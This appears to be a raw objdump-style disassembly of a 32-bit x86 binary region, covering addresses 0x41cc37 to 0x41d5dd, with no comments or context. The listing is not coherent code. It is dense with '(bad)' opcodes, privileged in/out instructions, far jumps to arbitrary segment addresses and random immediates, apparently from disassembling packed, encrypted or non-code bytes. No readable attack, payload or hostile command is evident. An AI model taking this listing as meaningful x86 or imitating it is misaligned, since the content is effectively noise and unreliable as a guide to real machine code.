  41cc37:	or     bl,BYTE PTR [edx+eiz*8+0x2d332db1]
  41cc3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc3f:	push   edi
  41cc40:	cld    
  41cc41:	loope  0x41cbcb
  41cc43:	test   BYTE PTR [edi+0x566f41ea],al
  41cc49:	adc    BYTE PTR [edx+edx*2+0x7d],al
  41cc4d:	aas    
  41cc4e:	pop    esp
  41cc4f:	mov    eax,ds:0x532d4800
  41cc54:	cmp    dl,BYTE PTR [edi+0x4b46310f]
  41cc5a:	sub    eax,0x8a5c3b12
  41cc5f:	ror    ecx,cl
  41cc61:	push   ecx
  41cc62:	inc    ebx
  41cc63:	adc    eax,0x600520b2
  41cc68:	mov    ebp,0xb5223092
  41cc6d:	repnz (bad) 
  41cc6f:	xchg   edi,eax
  41cc70:	repnz out dx,eax
  41cc72:	aaa    
  41cc73:	imul   eax,DWORD PTR [esi],0x9
  41cc76:	dec    ecx
  41cc77:	mov    ebp,0xd6249c0e
  41cc7c:	xor    DWORD PTR [ebp+0x45],esp
  41cc7f:	sahf   
  41cc80:	pop    ebp
  41cc81:	or     eax,0xc9c4a20c
  41cc86:	jb     0x41cc57
  41cc88:	xor    cl,0x5d
  41cc8b:	ret    
  41cc8c:	cdq    
  41cc8d:	jl     0x41ccfa
  41cc8f:	or     bh,BYTE PTR [eax]
  41cc91:	or     al,BYTE PTR [ebx]
  41cc93:	out    0x78,al
  41cc95:	ja     0x41cc3c
  41cc97:	jg     0x41cc33
  41cc99:	sbb    ah,ch
  41cc9b:	pop    ebp
  41cc9c:	test   al,0x35
  41cc9e:	fadd   QWORD PTR [eax-0x23365d7]
  41cca4:	outs   dx,BYTE PTR ds:[esi]
  41cca5:	xchg   ecx,eax
  41cca6:	dec    ebp
  41cca7:	jmp    0x8b2c:0xc790b80f
  41ccae:	adc    eax,DWORD PTR [eax-0x56]
  41ccb1:	add    edi,DWORD PTR [ebx]
  41ccb3:	jg     0x41cc6c
  41ccb5:	fst    DWORD PTR [esi-0x79]
  41ccb8:	add    BYTE PTR [ebx-0x75],cl
  41ccbb:	je     0x41cc3d
  41ccbd:	inc    esi
  41ccbe:	push   edi
  41ccbf:	fist   WORD PTR [eax+0x32c93d33]
  41ccc5:	out    dx,eax
  41ccc6:	in     al,dx
  41ccc7:	loope  0x41cc67
  41ccc9:	stos   BYTE PTR es:[edi],al
  41ccca:	fwait
  41cccb:	imul   DWORD PTR [esi+0x23]
  41ccce:	mov    edx,0x1cbd2122
  41ccd3:	mov    cl,0x75
  41ccd5:	inc    ebx
  41ccd6:	ins    DWORD PTR es:[edi],dx
  41ccd7:	sub    BYTE PTR [ecx-0x4c8a56c4],ah
  41ccdd:	data16 or cl,BYTE PTR [ebp+0x5a9aefd8]
  41cce4:	nop    DWORD PTR [eax*2+0x10bbda30]
  41ccec:	push   esp
  41cced:	and    al,0x7d
  41ccef:	xchg   esp,eax
  41ccf0:	pop    esi
  41ccf1:	shl    DWORD PTR [edi],cl
  41ccf3:	fld    TBYTE PTR [ebp-0x4f]
  41ccf6:	jg     0x41cd4a
  41ccf8:	push   edx
  41ccf9:	add    BYTE PTR [esi],al
  41ccfb:	mov    bl,0x19
  41ccfd:	xor    al,0x32
  41ccff:	aas    
  41cd00:	sar    BYTE PTR [edx+esi*2+0x4e],0xb9
  41cd05:	test   ebx,edi
  41cd07:	test   DWORD PTR [esi],0x8467248f
  41cd0d:	jle    0x41cd62
  41cd0f:	mov    DWORD PTR [eax],0x0
	...
  41cd71:	add    BYTE PTR [eax],al
  41cd73:	add    BYTE PTR [eax-0x67],ah
  41cd76:	fsubr  st(5),st
  41cd78:	std    
  41cd79:	in     eax,0x79
  41cd7b:	popf   
  41cd7c:	in     al,dx
  41cd7d:	stc    
  41cd7e:	jmp    0x41cdb0
  41cd80:	mov    dh,0xaf
  41cd82:	out    dx,al
  41cd83:	repz pop eax
  41cd85:	xor    al,BYTE PTR [ecx]
  41cd87:	add    BYTE PTR [ecx+eax*1],al
  41cd8a:	add    BYTE PTR [eax],al
  41cd8c:	xchg   esi,eax
  41cd8d:	cmc    
  41cd8e:	sbb    bh,dl
  41cd90:	arpl   WORD PTR [ebx-0x4d],di
  41cd93:	xchg   esi,eax
  41cd94:	or     edx,DWORD PTR [ebp-0x3d]
  41cd97:	sbb    BYTE PTR [edi],bl
  41cd99:	sub    eax,0x68a7d1a2
  41cd9e:	iret   
  41cd9f:	or     eax,0x1e30700e
  41cda4:	pmuludq mm3,mm3
  41cda7:	pop    esp
  41cda8:	test   bl,ch
  41cdaa:	rcl    BYTE PTR [esi],1
  41cdac:	mov    dl,0xd8
  41cdae:	sbb    ebx,esp
  41cdb0:	add    eax,DWORD PTR [ecx]
  41cdb2:	es shl dh,0x79
  41cdb6:	inc    esp
  41cdb7:	sub    ebp,edx
  41cdb9:	ret    
  41cdba:	stc    
  41cdbb:	sub    BYTE PTR [eax-0x6a],ah
  41cdbe:	mov    esp,0xc8ebc872
  41cdc3:	mov    edx,0x81a74059
  41cdc8:	and    edi,DWORD PTR [ecx]
  41cdca:	int3   
  41cdcb:	daa    
  41cdcc:	adc    edi,DWORD PTR [edx+eiz*4-0x3074f078]
  41cdd3:	xchg   edx,eax
  41cdd4:	xchg   ebx,eax
  41cdd5:	xor    esp,DWORD PTR [edx-0x4082fdef]
  41cddb:	loop   0x41cd76
  41cddd:	add    BYTE PTR [edi],bl
  41cddf:	mov    eax,ds:0xb7b75c0f
  41cde4:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41cde6:	or     bl,BYTE PTR [ebp+0x43]
  41cde9:	sub    ecx,DWORD PTR [esi]
  41cdeb:	inc    ebp
  41cdec:	sub    ch,ch
  41cdee:	(bad)  [ecx+0x7]
  41cdf1:	push   ebx
  41cdf2:	cmp    DWORD PTR [ebp-0x50],ebp
  41cdf5:	jne    0x41cda0
  41cdf7:	jne    0x41ce45
  41cdf9:	das    
  41cdfa:	adc    esp,DWORD PTR [ebp+edx*1+0x292c4324]
  41ce01:	mov    ch,0xa8
  41ce03:	xor    ecx,DWORD PTR [ebx+ebx*2-0xf]
  41ce07:	repz rcl BYTE PTR [edx],0xe4
  41ce0b:	push   es
  41ce0c:	xchg   esi,eax
  41ce0d:	cmc    
  41ce0e:	mov    edi,0x600e4303
  41ce13:	fwait
  41ce14:	inc    esi
  41ce15:	test   BYTE PTR [ecx+0x46e0c5a2],bh
  41ce1b:	loopne 0x41cdea
  41ce1d:	cmp    BYTE PTR [ecx],al
  41ce1f:	call   DWORD PTR [ebp+ecx*8-0x67ac741c]
  41ce26:	sub    eax,0x4d3ac6f5
  41ce2b:	lods   eax,DWORD PTR ds:[esi]
  41ce2c:	push   ebp
  41ce2d:	adc    edi,DWORD PTR [ecx+0x17055b75]
  41ce33:	sbb    BYTE PTR [edx],dh
  41ce35:	jge    0x41ce5d
  41ce37:	mov    edi,esp
  41ce39:	dec    esi
  41ce3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce3b:	push   ebx
  41ce3c:	jge    0x41ce78
  41ce3e:	aaa    
  41ce3f:	adc    BYTE PTR [eax],cl
  41ce41:	aam    0x2a
  41ce43:	add    dh,BYTE PTR [edi]
  41ce45:	ret    
  41ce46:	jge    0x41cde4
  41ce48:	fisub  WORD PTR [ebx+edx*8-0x2df8a8cf]
  41ce4f:	mov    eax,0x6cf14188
  41ce54:	push   0xe5bd1331
  41ce59:	mov    ds:0xa4d76a18,al
  41ce5e:	imul   edi,DWORD PTR [ecx+0x51e0c90e],0xe555a51f
  41ce68:	mov    bl,0x35
  41ce6a:	pop    ecx
  41ce6b:	out    dx,eax
  41ce6c:	aas    
  41ce6d:	push   0xc8f3cc2a
  41ce72:	mov    ecx,0xa02f88d7
  41ce77:	cwde   
  41ce78:	push   eax
  41ce79:	je     0x41ce44
  41ce7b:	les    edx,FWORD PTR [ebx-0x56c03c0c]
  41ce81:	fist   DWORD PTR [ebp+0x196f5d74]
  41ce87:	test   eax,0xc09186db
  41ce8c:	xchg   esi,eax
  41ce8d:	daa    
  41ce8e:	pushf  
  41ce8f:	das    
	...
  41cef4:	pop    es
  41cef5:	jp     0x41cedf
  41cef7:	jnp    0x41cef6
  41cef9:	sti    
  41cefa:	xchg   edi,eax
  41cefb:	jle    0x41cf44
  41cefd:	jp     0x41ced9
  41ceff:	lods   al,BYTE PTR ds:[esi]
  41cf00:	mov    eax,ds:0x5c1bb29b
  41cf05:	xor    eax,DWORD PTR [ecx]
  41cf07:	add    BYTE PTR [ecx+eax*1],al
  41cf0a:	add    BYTE PTR [eax],al
  41cf0c:	test   eax,0xa69833ad
  41cf11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf12:	push   edx
  41cf13:	paddb  mm7,QWORD PTR [esp+esi*2+0x4e]
  41cf18:	repz fstp st(4)
  41cf1b:	stc    
  41cf1c:	dec    ebp
  41cf1d:	jnp    0x41ced1
  41cf1f:	and    ebx,DWORD PTR [eax+ebp*2-0x5ca7e080]
  41cf26:	jl     0x41cf30
  41cf28:	pop    es
  41cf29:	jge    0x41cef5
  41cf2b:	and    al,BYTE PTR [ecx-0x2c]
  41cf2e:	enter  0xc1dc,0xba
  41cf32:	test   eax,0x431cd492
  41cf37:	aaa    
  41cf38:	out    dx,eax
  41cf39:	mov    ebp,0x58e11a04
  41cf3e:	adc    BYTE PTR [ebx-0x72],0xe7
  41cf42:	aam    0xd
  41cf44:	sbb    BYTE PTR [ebp+0x60],0x2f
  41cf48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf49:	adc    al,0x5f
  41cf4b:	lea    esp,[eax+0x48df5214]
  41cf51:	mov    edx,es
  41cf53:	mov    fs,WORD PTR es:[edi-0x6]
  41cf57:	ror    DWORD PTR [edx+0x50],0x45
  41cf5b:	mov    ch,0x9b
  41cf5d:	aas    
  41cf5e:	cmp    BYTE PTR [esi],bh
  41cf60:	push   0xffffffbd
  41cf62:	xchg   BYTE PTR [esi+0x5698e8de],bh
  41cf68:	pusha  
  41cf69:	rol    DWORD PTR [ebp+0x6c],cl
  41cf6c:	pop    es
  41cf6d:	or     bh,bh
  41cf6f:	dec    esi
  41cf70:	fcom   QWORD PTR ds:0x9afa650a
  41cf76:	cmp    edi,DWORD PTR [ecx-0x6f]
  41cf79:	mov    ds:0xfb45e3fd,al
  41cf7e:	in     eax,dx
  41cf7f:	xor    DWORD PTR [edi],esp
  41cf81:	push   ds
  41cf82:	js     0x41cf83
  41cf84:	jecxz  0x41d003
  41cf86:	cmp    ah,cl
  41cf88:	push   ebp
  41cf89:	xchg   edx,eax
  41cf8a:	xlat   BYTE PTR ds:[ebx]
  41cf8b:	dec    eax
  41cf8c:	jmp    0xa423:0x5a281117
  41cf93:	call   FWORD PTR [ecx]
  41cf95:	xor    ch,BYTE PTR [edx-0x59]
  41cf98:	mov    bh,BYTE PTR [edi]
  41cf9a:	xor    eax,DWORD PTR [esi]
  41cf9c:	inc    edi
  41cf9d:	jle    0x41cfdc
  41cf9f:	loope  0x41d014
  41cfa1:	es jg  0x41cf9f
  41cfa4:	push   ebp
  41cfa5:	mov    al,0xdc
  41cfa7:	popa   
  41cfa8:	aad    0x59
  41cfaa:	jle    0x41cf88
  41cfac:	(bad)  
  41cfad:	mov    cl,0x71
  41cfaf:	imul   eax,DWORD PTR [edx+0x5e],0xa22d0c1e
  41cfb6:	fsub   QWORD PTR [ecx+0x544d3722]
  41cfbc:	and    BYTE PTR [edi-0x4],cl
  41cfbf:	pop    ss
  41cfc0:	xchg   ebp,eax
  41cfc1:	clc    
  41cfc2:	pop    ebx
  41cfc3:	rcr    DWORD PTR [esi+0x4b],1
  41cfc6:	lods   al,BYTE PTR ds:[esi]
  41cfc7:	out    dx,eax
  41cfc8:	mov    al,ds:0xffbbdb4d
  41cfcd:	int3   
  41cfce:	icebp  
  41cfcf:	loope  0x41d013
  41cfd1:	outs   dx,BYTE PTR ds:[esi]
  41cfd2:	xchg   DWORD PTR [edx],esi
  41cfd4:	out    0x47,al
  41cfd6:	sub    ecx,DWORD PTR [eax-0x6d]
  41cfd9:	daa    
  41cfda:	js     0x41d021
  41cfdc:	jnp    0x41d018
  41cfde:	jmp    0x87891c4a
  41cfe3:	jmp    0x2a92c54a
  41cfe8:	pop    ebp
  41cfe9:	shr    DWORD PTR [edi-0x57],1
  41cfec:	mov    edi,0xdfafcacf
  41cff1:	xchg   ecx,eax
  41cff2:	ds pop ebp
  41cff4:	sti    
  41cff5:	adc    ebx,DWORD PTR [ecx*2-0x6481a3ed]
  41cffc:	adc    bh,ch
  41cffe:	loope  0x41cfa0
  41d000:	inc    ecx
  41d001:	and    al,BYTE PTR [ebp-0x427b9180]
  41d007:	aam    0x8f
  41d009:	int    0x1c
  41d00b:	jge    0x41d01b
  41d00d:	sbb    eax,eax
  41d00f:	mov    es,WORD PTR [eax]
	...
  41d071:	add    BYTE PTR [eax],al
  41d073:	add    BYTE PTR [ecx-0x52bcdfcc],bh
  41d079:	push   edi
  41d07a:	sti    
  41d07b:	dec    BYTE PTR [esi-0x1b]
  41d07e:	mov    ebp,0xc79edebd
  41d083:	mov    bh,0x60
  41d085:	xor    al,0x1
  41d087:	add    BYTE PTR [ecx+eax*1],al
  41d08a:	add    BYTE PTR [eax],al
  41d08c:	mov    BYTE PTR [esi+esi*8],dl
  41d08f:	xchg   ebx,eax
  41d090:	sbb    DWORD PTR [esi],ecx
  41d092:	jecxz  0x41d103
  41d094:	push   ebp
  41d095:	into   
  41d096:	leave  
  41d097:	or     cl,al
  41d099:	out    dx,eax
  41d09a:	jp     0x41d062
  41d09c:	sar    BYTE PTR [eax-0x23],1
  41d09f:	test   BYTE PTR [edi],bh
  41d0a1:	jae    0x41d047
  41d0a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d0a4:	xlat   BYTE PTR ds:[ebx]
  41d0a5:	repnz inc ecx
  41d0a7:	shr    BYTE PTR [ebp+0x460ac16a],1
  41d0ad:	xor    BYTE PTR [edx],dh
  41d0af:	dec    esp
  41d0b0:	sub    eax,0x84a5db24
  41d0b5:	enter  0x9046,0x73
  41d0b9:	push   edx
  41d0ba:	sbb    DWORD PTR [ebx-0x28],edi
  41d0bd:	mov    bh,0x9
  41d0bf:	add    ebx,0x40a7e326
  41d0c5:	mov    ebp,0x71e74498
  41d0ca:	add    eax,0xf877cc9c
  41d0cf:	jecxz  0x41d092
  41d0d1:	mov    ebx,0xb84efe7
  41d0d6:	scas   eax,DWORD PTR es:[edi]
  41d0d7:	mov    eax,ds:0x997e2c8a
  41d0dc:	cmp    al,0x1f
  41d0de:	dec    edx
  41d0df:	sub    dl,BYTE PTR [ebx-0x75d6239d]
  41d0e5:	sub    DWORD PTR [ecx],esi
  41d0e7:	iret   
  41d0e8:	jge    0x41d0f7
  41d0ea:	rcl    DWORD PTR [esi+edx*2],0x52
  41d0ee:	(bad)  
  41d0ef:	adc    ebp,ecx
  41d0f1:	push   ebp
  41d0f2:	pop    ecx
  41d0f3:	inc    eax
  41d0f4:	addr16 loop 0x41d0bc
  41d0f7:	sbb    eax,0x65dc4b0c
  41d0fc:	add    eax,0xf7e45fc1
  41d101:	shl    ebp,0x93
  41d104:	pusha  
  41d105:	cwde   
  41d106:	cmp    ch,BYTE PTR [edi+0x7b]
  41d109:	mov    edx,0xdfe01851
  41d10e:	test   al,0xd7
  41d110:	mov    ss,eax
  41d112:	xchg   DWORD PTR ds:0x72c2d318,edi
  41d118:	mov    ds:0xc3f89050,eax
  41d11d:	loop   0x41d18d
  41d11f:	imul   ecx
  41d121:	ficom  WORD PTR [esi+eax*2-0x1d]
  41d125:	(bad)  
  41d126:	jo     0x41d163
  41d128:	inc    ebx
  41d129:	jmp    0xaab6:0xaf60c2f1
  41d130:	fist   DWORD PTR [eax]
  41d132:	(bad)  
  41d133:	sti    
  41d134:	sub    dh,BYTE PTR [ecx+0x57fa3b02]
  41d13a:	sub    BYTE PTR ds:0x2d0ba69c,dh
  41d140:	jns    0x41d191
  41d142:	(bad)  
  41d143:	les    ebp,FWORD PTR [ebx-0x48e43ea8]
  41d149:	xchg   edx,eax
  41d14a:	jecxz  0x41d157
  41d14c:	add    al,0x6
  41d14e:	or     eax,ebp
  41d150:	mov    al,ds:0x88249347
  41d155:	dec    ebx
  41d156:	push   es
  41d157:	popa   
  41d158:	push   ebp
  41d159:	jmp    0x41d116
  41d15b:	and    eax,0x5747fa2d
  41d160:	sti    
  41d161:	mov    fs,WORD PTR [edi+0x23e3735d]
  41d167:	iret   
  41d168:	xchg   BYTE PTR [edi+0x43abbc16],dl
  41d16e:	mov    ebx,0x3929e522
  41d173:	out    0x0,al
  41d175:	push   ebp
  41d176:	sbb    eax,0xf7859d23
  41d17b:	call   0x36dc:0xf8d241d7
  41d182:	stos   DWORD PTR es:[edi],eax
  41d183:	or     DWORD PTR [esi-0x5b],esi
  41d186:	inc    edi
  41d187:	mov    cl,0xf5
  41d189:	sbb    DWORD PTR [ebx+eiz*4],ecx
  41d18c:	and    BYTE PTR [edx-0x21],dh
  41d18f:	les    eax,FWORD PTR [eax]
	...
  41d1f1:	add    BYTE PTR [eax],al
  41d1f3:	add    BYTE PTR [eax-0x3d],dl
  41d1f6:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d1fc:	xor    DWORD PTR [ebp-0x7],esp
  41d1ff:	hlt    
  41d200:	xchg   edi,eax
  41d201:	loop   0x41d217
  41d203:	inc    ebx
  41d204:	fs xor eax,0x1040001
  41d20a:	add    BYTE PTR [eax],al
  41d20c:	inc    edx
  41d20d:	mov    BYTE PTR [ecx],ch
  41d20f:	int    0xb9
  41d211:	std    
  41d212:	mov    al,ds:0xb2eecb85
  41d217:	pushf  
  41d218:	call   0xac68488b
  41d21d:	xor    BYTE PTR [edi+edi*2-0x66],ah
  41d221:	(bad)  
  41d222:	out    dx,eax
  41d223:	(bad)  
  41d225:	test   al,0x85
  41d227:	pop    edx
  41d228:	pop    ds
  41d229:	sub    al,0x19
  41d22b:	sbb    al,0x42
  41d22d:	lock xchg eax,eax
  41d230:	inc    eax
  41d231:	or     eax,0xc3e1f1fd
  41d236:	clc    
  41d237:	pop    ds
  41d238:	mov    ecx,0x68f93d2b
  41d23d:	add    eax,0x27318997
  41d242:	rol    DWORD PTR [ecx],1
  41d244:	jo     0xdab79a4d
  41d24a:	cmp    esp,ecx
  41d24c:	std    
  41d24d:	pop    eax
  41d24e:	loope  0x41d27a
  41d250:	pop    esi
  41d251:	sbb    cl,BYTE PTR [edx+0x2a]
  41d254:	add    BYTE PTR [eax-0x6450132f],bl
  41d25a:	push   ebx
  41d25b:	xor    bh,BYTE PTR [edx*8+0x2f585234]
  41d262:	pop    es
  41d263:	cwde   
  41d264:	dec    edi
  41d265:	pop    es
  41d266:	dec    eax
  41d267:	pusha  
  41d268:	loope  0x41d2c3
  41d26a:	arpl   WORD PTR ds:0xab5acdcc,cx
  41d270:	daa    
  41d271:	inc    ebx
  41d272:	inc    edx
  41d273:	imul   ebx,DWORD PTR [esi+0x528f1217],0xfb8c0b33
  41d27d:	push   ecx
  41d27e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d27f:	daa    
  41d280:	clc    
  41d281:	addr16 add ah,ch
  41d284:	cmp    BYTE PTR [ebp+0x30],dl
  41d287:	stc    
  41d288:	nop
  41d289:	inc    esi
  41d28a:	ins    BYTE PTR es:[edi],dx
  41d28b:	(bad)  
  41d28c:	jno    0x41d248
  41d28e:	xchg   esi,eax
  41d28f:	pop    ss
  41d290:	sbb    al,0x26
  41d292:	ret    0x68c
  41d295:	jge    0x41d2ab
  41d297:	pushf  
  41d298:	call   0xea2555e4
  41d29d:	inc    eax
  41d29e:	add    ch,BYTE PTR [ebp+0x32]
  41d2a1:	sbb    al,0x61
  41d2a3:	mov    edi,DWORD PTR [esi+0x49d32856]
  41d2a9:	push   ss
  41d2aa:	repz shl ebp,0xd3
  41d2ae:	inc    ecx
  41d2af:	and    bh,0xbd
  41d2b2:	push   ecx
  41d2b3:	js     0x41d2a9
  41d2b5:	out    0x1f,eax
  41d2b7:	lea    eax,[esi+0x3a]
  41d2ba:	and    ebx,DWORD PTR [esp+ebx*1+0x1dbb1d61]
  41d2c1:	int3   
  41d2c2:	ds pop es
  41d2c4:	out    dx,al
  41d2c5:	inc    ebx
  41d2c6:	sbb    al,0x9e
  41d2c8:	shl    bl,0x9a
  41d2cb:	ret    
  41d2cc:	rol    DWORD PTR [ebp+0x50f1eda6],1
  41d2d2:	cmp    edx,edx
  41d2d4:	mov    ah,0x32
  41d2d6:	test   BYTE PTR [ebp+eax*4-0x4c6e8217],cl
  41d2dd:	xor    dl,BYTE PTR [ebx]
  41d2df:	call   0x35be:0xdb6c519f
  41d2e6:	inc    BYTE PTR [ebp-0x3a]
  41d2e9:	icebp  
  41d2ea:	pusha  
  41d2eb:	lods   al,BYTE PTR ds:[esi]
  41d2ec:	cmp    BYTE PTR [edi-0x34ccf413],bh
  41d2f2:	popf   
  41d2f3:	mov    ebx,0x6d54c741
  41d2f8:	sets   BYTE PTR [esi+esi*1]
  41d2fc:	xor    BYTE PTR ss:[edi+0x2aa107c6],0x12
  41d304:	mov    eax,ds:0x42ec12a3
  41d309:	jae    0x41d2a5
  41d30b:	(bad)  
  41d30c:	sbb    DWORD PTR ds:[esp+eiz*8+0x0],ebp
	...
  41d374:	inc    BYTE PTR [eax+0x7dff54f9]
  41d37a:	jmp    FWORD PTR [edx+0x69c02f8d]
  41d380:	fcmovnu st,st(7)
  41d382:	or     esp,DWORD PTR [ebx+0x68]
  41d385:	add    DWORD PTR ss:[eax],eax
  41d388:	add    al,0x1
  41d38a:	add    BYTE PTR [eax],al
  41d38c:	pop    DWORD PTR [edx+0x15]
  41d38f:	inc    edx
  41d390:	enter  0xe2bb,0x3c
  41d394:	ins    BYTE PTR es:[edi],dx
  41d395:	popf   
  41d396:	test   BYTE PTR [ebp-0x7660d08e],cl
  41d39c:	rol    BYTE PTR [edx-0x79],0xac
  41d3a0:	out    0x57,al
  41d3a2:	fsubr  st,st(2)
  41d3a4:	lods   al,BYTE PTR ds:[esi]
  41d3a5:	pop    ebp
  41d3a6:	mov    ebx,0x8c468950
  41d3ab:	and    DWORD PTR [edx+ecx*2+0x587f45cc],ebp
  41d3b2:	add    ah,BYTE PTR [ecx+0xe720dc3]
  41d3b8:	sub    ebx,esp
  41d3ba:	jno    0x41d34c
  41d3bc:	aas    
  41d3bd:	outs   dx,DWORD PTR ds:[esi]
  41d3be:	in     eax,0xcb
  41d3c0:	mov    dl,0x4f
  41d3c2:	push   ss
  41d3c3:	icebp  
  41d3c4:	inc    esp
  41d3c5:	je     0x41d35c
  41d3c7:	in     al,dx
  41d3c8:	mov    ecx,DWORD PTR [ebx]
  41d3ca:	sub    al,ch
  41d3cc:	cmp    al,0x2e
  41d3ce:	mov    dh,al
  41d3d0:	out    dx,al
  41d3d1:	add    ah,bl
  41d3d3:	jnp    0x41d439
  41d3d5:	xor    ecx,ebx
  41d3d7:	jno    0x41d39f
  41d3d9:	pop    edi
  41d3da:	mov    edx,0xa4401d13
  41d3df:	clc    
  41d3e0:	mov    eax,ds:0xdbda06
  41d3e5:	pop    esp
  41d3e6:	aam    0x71
  41d3e8:	in     eax,dx
  41d3e9:	cld    
  41d3ea:	xchg   esp,eax
  41d3eb:	je     0x41d3e4
  41d3ed:	sub    DWORD PTR [edi],edx
  41d3ef:	int    0x9d
  41d3f1:	dec    edi
  41d3f2:	retf   
  41d3f3:	shr    DWORD PTR ds:[ecx+0x41720da0],0xe
  41d3fb:	repnz add dh,0x7a
  41d3ff:	mov    cl,0x64
  41d401:	push   ss
  41d402:	dec    edx
  41d403:	inc    BYTE PTR [ecx+0x14298e7c]
  41d409:	out    dx,eax
  41d40a:	icebp  
  41d40b:	loop   0x41d42a
  41d40d:	mov    edi,0x2556344
  41d412:	xchg   ch,dl
  41d414:	add    edx,edi
  41d416:	and    BYTE PTR [edi+0x6effc5fd],dh
  41d41c:	xor    dl,ah
  41d41e:	jo     0x41d3aa
  41d420:	cdq    
  41d421:	into   
  41d422:	xor    BYTE PTR [eax-0x6a],0xe9
  41d426:	fcomp  st(7)
  41d428:	jne    0x41d473
  41d42a:	sbb    bl,bl
  41d42c:	arpl   WORD PTR [ebx],bp
  41d42e:	test   dh,dl
  41d430:	aad    0x3
  41d432:	inc    edi
  41d433:	std    
  41d434:	es retf 
  41d436:	dec    edi
  41d437:	mov    bl,0x5a
  41d439:	out    dx,eax
  41d43a:	mov    WORD PTR [eax],?
  41d43c:	mov    al,0x26
  41d43e:	push   ebp
  41d43f:	ss jecxz 0x41d3c6
  41d442:	ret    
  41d443:	bound  edi,QWORD PTR [edi]
  41d445:	test   al,0x59
  41d447:	jp     0x41d4bf
  41d449:	fwait
  41d44a:	ins    DWORD PTR es:[edi],dx
  41d44b:	push   ss
  41d44c:	aad    0xb1
  41d44e:	inc    esi
  41d44f:	jle    0x41d455
  41d451:	inc    ebx
  41d452:	pop    DWORD PTR [ebx+0x2b69b815]
  41d458:	nop
  41d459:	mov    edi,0xb6ad8787
  41d45e:	add    al,0x6c
  41d460:	mov    esp,0x4092fec5
  41d465:	(bad)  
  41d466:	(bad)  
  41d468:	dec    edi
  41d469:	mul    DWORD PTR [esi]
  41d46b:	cmc    
  41d46c:	cdq    
  41d46d:	sbb    BYTE PTR [ecx+0x5b],dl
  41d470:	push   cs
  41d471:	sub    cl,BYTE PTR [edx-0x4e]
  41d474:	push   0xb4e40543
  41d479:	pop    ds
  41d47a:	aas    
  41d47b:	mov    ah,0x79
  41d47d:	into   
  41d47e:	inc    edx
  41d47f:	(bad)  
  41d480:	stc    
  41d481:	sbb    al,0xe4
  41d483:	enter  0xfb43,0x24
  41d487:	mov    cl,BYTE PTR [edx+ebx*8]
  41d48a:	jecxz  0x41d4ae
  41d48c:	dec    ebx
  41d48d:	sbb    eax,0xb5b0
	...
  41d4f2:	add    BYTE PTR [eax],al
  41d4f4:	div    BYTE PTR [esi]
  41d4f6:	rcl    BYTE PTR [edx+edx*8+0x7d76f6f4],cl
  41d4fd:	nop
  41d4fe:	call   0x6cd8:0xaa6c8b89
  41d505:	aaa    
  41d506:	add    DWORD PTR [eax],eax
  41d508:	add    al,0x1
  41d50a:	add    BYTE PTR [eax],al
  41d50c:	xchg   ebp,eax
  41d50d:	xor    ebx,DWORD PTR ds:0x19780102
  41d513:	mov    ebp,0x62a1489b
  41d518:	mov    esi,0x959fea86
  41d51d:	cld    
  41d51e:	int    0x76
  41d520:	popa   
  41d521:	lock xchg ecx,eax
  41d523:	pop    ebx
  41d524:	outs   dx,BYTE PTR ds:[esi]
  41d525:	xor    eax,0xb5ea8813
  41d52a:	repnz stc 
  41d52c:	es dec edx
  41d52e:	jecxz  0x41d593
  41d530:	dec    esi
  41d531:	push   ebx
  41d532:	fnstcw WORD PTR ds:0xef19be75
  41d538:	sub    ch,BYTE PTR [ebx]
  41d53a:	add    eax,0x51e31126
  41d53f:	adc    esp,DWORD PTR [ebp+0x11]
  41d542:	popa   
  41d543:	repz and eax,0x240a29a0
  41d549:	sbb    eax,0xad02bbf8
  41d54e:	lods   al,BYTE PTR ds:[esi]
  41d54f:	cwde   
  41d550:	pop    eax
  41d551:	inc    BYTE PTR [eax]
  41d553:	lods   eax,DWORD PTR ds:[esi]
  41d554:	iret   
  41d555:	retf   0x307f
  41d558:	xor    edi,edi
  41d55a:	fwait
  41d55b:	jns    0x41d506
  41d55d:	stc    
  41d55e:	aas    
  41d55f:	xor    ah,0x8d
  41d562:	jo     0x41d5a1
  41d564:	pop    ds
  41d565:	push   edi
  41d566:	sbb    bh,dh
  41d568:	jg     0x41d55d
  41d56a:	add    BYTE PTR [edi+0x2237545f],cl
  41d570:	sub    DWORD PTR [ecx],edi
  41d572:	cs (bad) 
  41d574:	jecxz  0x41d51c
  41d576:	aas    
  41d577:	lock jg 0x41d54e
  41d57a:	mov    edi,0x927643d3
  41d57f:	or     al,0xb7
  41d581:	xchg   edi,eax
  41d582:	outs   dx,DWORD PTR ds:[esi]
  41d583:	mov    ecx,0xbe442583
  41d588:	push   ecx
  41d589:	sbb    eax,0x6313d8b5
  41d58e:	mov    ds:0xe4ea303a,al
  41d593:	mov    BYTE PTR [esi-0x74ac8e33],ch
  41d599:	push   ecx
  41d59a:	shl    DWORD PTR [ecx+0x32],cl
  41d59d:	(bad)  
  41d59e:	mov    bl,0xa5
  41d5a0:	mov    WORD PTR [ebx+0x45],?
  41d5a3:	xchg   esp,eax
  41d5a4:	add    edx,DWORD PTR [ebx]
  41d5a6:	fwait
  41d5a7:	cmp    ebx,DWORD PTR [esi+0x30]
  41d5aa:	xor    edi,DWORD PTR [ecx+0x16]
  41d5ad:	loop   0x41d5e4
  41d5af:	add    esi,esi
  41d5b1:	lods   eax,DWORD PTR ds:[esi]
  41d5b2:	pop    ebx
  41d5b3:	xor    al,0x84
  41d5b5:	sbb    DWORD PTR [eax],esi
  41d5b7:	inc    edx
  41d5b8:	repz and eax,0x56d2d528
  41d5be:	addr16 mov dl,0x71
  41d5c1:	adc    ebx,ebp
  41d5c3:	inc    ecx
  41d5c4:	(bad)  
  41d5c6:	hlt    
  41d5c7:	fsubr  DWORD PTR [edx-0x1b]
  41d5ca:	popa   
  41d5cb:	xchg   esi,eax
  41d5cc:	pop    esi
  41d5cd:	inc    ebx
  41d5ce:	and    BYTE PTR [ebx-0x7fea609e],cl
  41d5d4:	ret    
  41d5d5:	adc    ecx,DWORD PTR [ecx]
  41d5d7:	ret    0x2282
  41d5da:	add    eax,edx
  41d5dc:	icebp  
  41d5dd:	out    dx,eax
